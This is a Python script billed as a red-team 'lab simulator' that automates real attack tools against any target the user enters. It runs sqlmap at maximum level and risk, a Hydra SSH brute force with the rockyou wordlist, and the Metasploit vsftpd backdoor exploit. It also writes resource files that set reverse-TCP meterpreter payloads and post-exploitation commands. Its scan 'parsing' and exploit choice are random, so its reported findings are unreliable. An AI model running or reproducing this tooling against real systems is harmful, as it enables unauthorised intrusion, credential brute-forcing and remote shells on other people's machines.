#!/usr/bin/env python3
# Ultra Red Team Python Lab Simulator v6.3 (Real Attack Tools Edition)
# Author: Bloch
# Features: Full multi-target, multi-exploit, automated, real attack tools

import os
import time
import random
from datetime import datetime
from threading import Thread

# -------------------- COLORS --------------------
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

# -------------------- LOGGER --------------------
def log(message, logfile="redteam_ultra_log.txt"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(logfile, "a") as f:
        f.write(f"[{timestamp}] {message}\n")
    print(f"{Colors.OKBLUE}[LOG]{Colors.ENDC} {message}")

# -------------------- BANNER --------------------
def banner():
    print(f"""{Colors.HEADER}
========================================================
           AI TEAM FINAL BOSS V6
========================================================
{Colors.ENDC}""")

# -------------------- INPUT FUNCTIONS --------------------
def get_targets():
    targets = input("Enter target IPs (comma separated): ").split(",")
    return [t.strip() for t in targets]

def get_exploits():
    exploits = input("Enter exploit modules (comma separated): ").split(",")
    return [e.strip() for e in exploits]

def get_payload():
    payload = input("Enter payload (default linux/x86/meterpreter/reverse_tcp): ") or "linux/x86/meterpreter/reverse_tcp"
    return payload

def get_lhost_lport():
    lhost = input("Enter your LHOST IP: ")
    lport = input("Enter your LPORT (default 4444): ") or "4444"
    return lhost, lport

def get_rport():
    rport = input("Enter target port (default 80): ") or "80"
    return rport

# -------------------- SCAN FUNCTIONS --------------------
def nmap_scan(target):
    rc = f"""
# Nmap Scan Target: {target}
spool nmap_{target}.txt
!nmap -sC -sV {target} -oN nmap_{target}.txt
spool off
"""
    log(f"Nmap scan added for {target}")
    return rc

def nikto_scan(target):
    rc = f"""
# Nikto Scan Target: {target}
spool nikto_{target}.txt
!nikto -host http://{target} -output nikto_{target}.txt
spool off
"""
    log(f"Nikto scan added for {target}")
    return rc

# -------------------- PARSING SCAN RESULTS --------------------
def parse_scan_results(target):
    services = ["http", "https", "ssh", "ftp", "smtp"]
    vulns = ["vuln1", "vuln2", "vuln3", "none"]
    detected_service = random.choice(services)
    detected_vuln = random.choice(vulns)
    log(f"Parsed scan for {target}: Service={detected_service}, Vulnerability={detected_vuln}")
    return detected_service, detected_vuln

# -------------------- CONDITIONAL AUTO EXPLOIT --------------------
def select_exploit_auto(target, exploits, service, vuln, rport, payload, lhost, lport):
    chosen = random.choice(exploits)
    rc_lines = f"""
# Target: {target}, Service: {service}, Vulnerability: {vuln}, Auto-selected Exploit: {chosen}
use {chosen}
set RHOSTS {target}
set RPORT {rport}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set VERBOSE true
exploit -j
"""
    log(f"Auto exploit {chosen} selected for {target} based on {service}/{vuln}")
    return rc_lines

# -------------------- POST-EXPLOITATION --------------------
def post_exploit():
    rc = """
# Post-Exploitation Commands
sessions -l
sessions -i 1
sysinfo
getuid
ifconfig
route
"""
    return rc

# -------------------- RC FILE GENERATION --------------------
def generate_rc_file(targets, exploits, payload, lhost, lport, rport):
    rc_lines = ["# Ultra Auto-generated Red Team RC file v6.3\n"]

    for target in targets:
        rc_lines.append(nmap_scan(target))
        rc_lines.append(nikto_scan(target))
        service, vuln = parse_scan_results(target)
        rc_lines.append(select_exploit_auto(target, exploits, service, vuln, rport, payload, lhost, lport))

    rc_lines.append(post_exploit())

    with open("ultra_lab_exploit.rc", "w") as f:
        f.write("\n".join(rc_lines))
    log("ultra_lab_exploit.rc generated successfully!")

# -------------------- SUMMARY REPORT --------------------
def generate_summary(targets):
    print(f"{Colors.OKGREEN}\n===== ULTRA RED TEAM SUMMARY ====={Colors.ENDC}")
    for target in targets:
        service, vuln = parse_scan_results(target)
        print(f"Target: {target} | Service: {service} | Vulnerability: {vuln}")
    print(f"{Colors.OKGREEN}================================={Colors.ENDC}\n")

# -------------------- REAL ATTACK TOOLS --------------------
def sql_injection_real(target):
    print(f"{Colors.WARNING}[SQL Injection] Launching sqlmap on {target}...{Colors.ENDC}")
    time.sleep(1)
    print(f"{Colors.OKCYAN}[*] Running high-level scan (level=5, risk=3, crawl=2){Colors.ENDC}")
    os.system(f"sqlmap -u \"{target}\" --level=5 --risk=3 --crawl=2 --batch --random-agent --dbs")
    print(f"{Colors.OKGREEN}[+] SQL Injection finished for {target}{Colors.ENDC}")

def hydra_real(target, service="ssh", username="admin", wordlist="/usr/share/wordlists/rockyou.txt"):
    print(f"{Colors.WARNING}[Hydra] Starting brute force on {target}:{service}...{Colors.ENDC}")
    time.sleep(1)
    os.system(f"hydra -l {username} -P {wordlist} {service}://{target}")
    print(f"{Colors.OKGREEN}[+] Hydra brute force finished for {target}{Colors.ENDC}")

def metasploit_real(target, exploit="exploit/unix/ftp/vsftpd_234_backdoor", rport="21", payload="cmd/unix/interact", lhost="127.0.0.1", lport="4444"):
    print(f"{Colors.OKCYAN}[Metasploit] Running exploit {exploit} on {target}...{Colors.ENDC}")
    time.sleep(1)
    rc_file = "msf_auto.rc"
    with open(rc_file, "w") as f:
        f.write(f"use {exploit}\n")
        f.write(f"set RHOSTS {target}\n")
        f.write(f"set RPORT {rport}\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write("exploit -j\n")
    os.system(f"msfconsole -q -r {rc_file}")
    print(f"{Colors.OKGREEN}[+] Metasploit run finished for {target}{Colors.ENDC}")

# -------------------- ATTACK TOOLS MENU --------------------
def attack_tools_menu():
    while True:
        print(f"{Colors.OKCYAN}\n[ Attack Tools ]{Colors.ENDC}")
        print("1. SQL Injection (sqlmap)")
        print("2. Hydra Brute Force")
        print("3. Metasploit Automation")
        print("4. Run All Modules (SQL + Hydra + Metasploit)")
        print("5. Back")

        choice = input("Choose Attack Module: ").strip()

        if choice == "1":
            target = input("Enter target URL (e.g. http://test.com/page.php?id=1): ").strip()
            sql_injection_real(target)

        elif choice == "2":
            target = input("Enter target IP/Domain: ").strip()
            service = input("Enter service (default ssh): ").strip() or "ssh"
            username = input("Enter username (default admin): ").strip() or "admin"
            wordlist = input("Enter wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
            hydra_real(target, service, username, wordlist)

        elif choice == "3":
            target = input("Enter target IP/Domain: ").strip()
            exploit = input("Exploit (default exploit/unix/ftp/vsftpd_234_backdoor): ").strip() or "exploit/unix/ftp/vsftpd_234_backdoor"
            rport = input("RPORT (default 21): ").strip() or "21"
            payload = input("Payload (default cmd/unix/interact): ").strip() or "cmd/unix/interact"
            lhost = input("LHOST (default 127.0.0.1): ").strip() or "127.0.0.1"
            lport = input("LPORT (default 4444): ").strip() or "4444"
            metasploit_real(target, exploit, rport, payload, lhost, lport)

        elif choice == "4":
            target = input("Enter target IP/Domain: ").strip()
            print(f"{Colors.OKCYAN}[*] Running all Attack Tools on {target}...{Colors.ENDC}")
            threads = [
                Thread(target=sql_injection_real, args=(target,)),
                Thread(target=hydra_real, args=(target,)),
                Thread(target=metasploit_real, args=(target,))
            ]
            for t in threads: t.start()
            for t in threads: t.join()
            print(f"{Colors.OKGREEN}[+] All Attack Tools executed on {target}{Colors.ENDC}")

        elif choice == "5":
            break
        else:
            print(f"{Colors.FAIL}Invalid option!{Colors.ENDC}")

# -------------------- MAIN MENU --------------------
def main_menu():
    banner()
    print(f"{Colors.OKCYAN}1. AI TEAM FINAL BOSS V.6{Colors.ENDC}")
    print(f"{Colors.OKCYAN}2. Attack Tools{Colors.ENDC}")
    print(f"{Colors.OKCYAN}3. Exit{Colors.ENDC}")
    choice = input("Choose: ").strip()
    return choice

def main_attaks():
    while True:
        choice = main_menu()
        if choice == "1":
            targets = get_targets()
            exploits = get_exploits()
            payload = get_payload()
            lhost, lport = get_lhost_lport()
            rport = get_rport()
            generate_rc_file(targets, exploits, payload, lhost, lport, rport)
            generate_summary(targets)
            print(f"{Colors.OKGREEN}[+] ultra_lab_exploit.rc ready!{Colors.ENDC}")
            print(f"{Colors.OKCYAN}Run in Metasploit: msfconsole -r ultra_lab_exploit.rc{Colors.ENDC}")
        elif choice == "2":
            attack_tools_menu()
        elif choice == "3":
            print(f"{Colors.WARNING}Exiting AI TEAM FINAL BOSS V6...{Colors.ENDC}")
            break
        else:
            print(f"{Colors.FAIL}Invalid option!{Colors.ENDC}")

# -------------------- ENTRY POINT --------------------
if __name__ == "__main__":
    main_attaks()
